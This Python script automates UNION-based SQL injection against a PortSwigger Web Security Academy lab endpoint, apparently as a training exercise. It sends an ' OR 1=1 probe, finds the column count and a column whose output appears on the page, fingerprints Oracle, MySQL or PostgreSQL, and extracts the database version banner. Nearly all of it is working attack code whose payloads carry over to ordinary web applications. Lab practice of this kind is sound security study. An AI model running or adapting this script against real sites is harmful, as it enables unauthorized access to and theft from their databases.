import re
import requests
from typing import List, Optional, Tuple

BASE_URL = "https://0a7200560328ba1a80dc08d1005c00e7.web-security-academy.net/filter"
PARAM_NAME = "category"
TIMEOUT = 10

session = requests.Session()
session.headers.update({"User-Agent": "Mozilla/5.0 (SQLi Tester)"})

COMMENT = "-- "  # 通用註解

def send_request(payload: str) -> Optional[requests.Response]:
    """發送測試請求"""
    print(f"    [Payload] {payload}")
    try:
        return session.get(BASE_URL, params={PARAM_NAME: payload}, timeout=TIMEOUT)
    except requests.RequestException as e:
        print(f"[!] Request error: {e}")
        return None

def detect_sqli() -> bool:
    print("[*] 偵測 SQLi")
    normal_payload = "Gifts"
    sqli_payload = f"' OR 1=1 {COMMENT}"
    normal_resp = send_request(normal_payload)
    sqli_resp = send_request(sqli_payload)
    if not normal_resp or not sqli_resp:
        return False
    if sqli_resp.status_code == 200 and len(sqli_resp.text) > len(normal_resp.text):
        print("[+] 目標可能存在 SQLi")
        return True
    print("[-] 未偵測到 SQLi")
    return False

def find_columns(max_columns: int = 20) -> Optional[int]:
    print("[*] 偵測欄位數")
    for num in range(1, max_columns + 1):
        payload = "' UNION SELECT " + ",".join(["NULL"] * num)  + " from dual "+ f" {COMMENT} "
        resp = send_request(payload)
        if resp and resp.status_code == 200 and "error" not in resp.text.lower():
            print(f"[+] 欄位數 = {num}")
            return num
    return None

def find_display_column(num_cols: int) -> Optional[int]:
    print("[*] 偵測可回顯欄位")
    for i in range(1, num_cols + 1):
        vals = ["NULL"] * num_cols
        vals[i - 1] = "'DISP_COL_TEST'"
        payload = f"' UNION SELECT {','.join(vals)} from dual {COMMENT}"
        resp = send_request(payload)
        if resp and "DISP_COL_TEST" in resp.text:
            print(f"[+] 可回顯欄位索引 = {i}")
            return i
    return None

def build_union(num_cols: int, disp_idx: int, expression: str, tail_from: str = "") -> str:
    vals = ["NULL"] * num_cols
    vals[disp_idx - 1] = expression
    return f"' UNION SELECT {','.join(vals)}{tail_from} {COMMENT}"

def try_detect_dbms(num_cols: int, disp_idx: int) -> Tuple[Optional[str], Optional[str]]:
    print("[*] 偵測 DBMS")
    tests = {
        "oracle": build_union(num_cols, disp_idx, "banner", " FROM v$version"),
        "mysql": build_union(num_cols, disp_idx, "@@version"),
        "postgres": build_union(num_cols, disp_idx, "version()"),
    }
    for dbms, payload in tests.items():
        r = send_request(payload)
        if not r: 
            continue
        text = r.text.lower()

        if dbms == "oracle" and "oracle" in text:
            print("[+] DBMS = Oracle")
            return dbms, r.text
        if dbms == "mysql" and "mysql" in text:
            print("[+] DBMS = MySQL/MariaDB")
            return dbms, r.text
        if dbms == "postgres" and "postgresql" in text:
            print("[+] DBMS = PostgreSQL")
            return dbms, r.text
    return None, None

def _html_to_lines(html: str):
    # 把易視為分行的標籤換成換行，其他標籤移除，再切行
    x = re.sub(r"(?i)<\s*br\s*/?\s*>", "\n", html)
    x = re.sub(r"(?i)</?(p|tr|td|li|div|span|pre|code|h\d)[^>]*>", "\n", x)
    x = re.sub(r"<[^>]+>", "", x)  # 去掉其餘標籤
    lines = [ln.strip() for ln in x.splitlines() if ln.strip()]
    return lines

def dump_version(num_cols: int, disp_idx: int, dbms: str):
    print("[*] 取得 DB 版本")
    if dbms == "mysql":
        payload = build_union(num_cols, disp_idx, "@@version")
    elif dbms == "postgres":
        payload = build_union(num_cols, disp_idx, "version()")
    elif dbms == "oracle":
        payload = build_union(num_cols, disp_idx, "banner", " FROM v$version")
    else:
        print("[-] 未知 DBMS，略過版本輸出")
        return

    r = send_request(payload)
    if not r or r.status_code != 200:
        print("[-] 無法取得版本資訊")
        return

    lines = _html_to_lines(r.text)

    if dbms == "postgres":
        # 直接回傳含 PostgreSQL 的整行 → e.g.
        # "PostgreSQL 12.22 (Ubuntu 12.22-0ubuntu0.20.04.4) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
        for ln in lines:
            if "PostgreSQL" in ln:
                print(f"[+] DB Version = {ln}")
                return

    elif dbms == "oracle":
        # 取含 Oracle Database 的整行（通常是 banner 其中一列）
        for ln in lines:
            if "Oracle" in ln and "Database" in ln:
                print(f"[+] DB Version = {ln}")
                return

    elif dbms == "mysql":
        # 先找包含 MySQL/MariaDB 的整行；找不到再退回純版本號
        for ln in lines:
            if "MySQL" in ln or "MariaDB" in ln:
                print(f"[+] DB Version = {ln}")
                return
        m = re.search(r"\b\d+\.\d+\.\d+(?:-[A-Za-z0-9._-]+)?\b", " ".join(lines))
        if m:
            print(f"[+] DB Version = {m.group(0)}")
            return

    # 落空時給一小段片段以利除錯（仍避免整頁）
    print("[?] 無法準確抽取版本字串，回應片段：", " ".join(lines)[:200])


if __name__ == "__main__":
    if not detect_sqli(): exit(0)
    col_cnt = find_columns()
    if not col_cnt: exit(0)
    disp_idx = find_display_column(col_cnt)
    if not disp_idx: exit(0)
    dbms, _ = try_detect_dbms(col_cnt, disp_idx)
    if not dbms: dbms = "mysql"
    dump_version(col_cnt, disp_idx, dbms)
 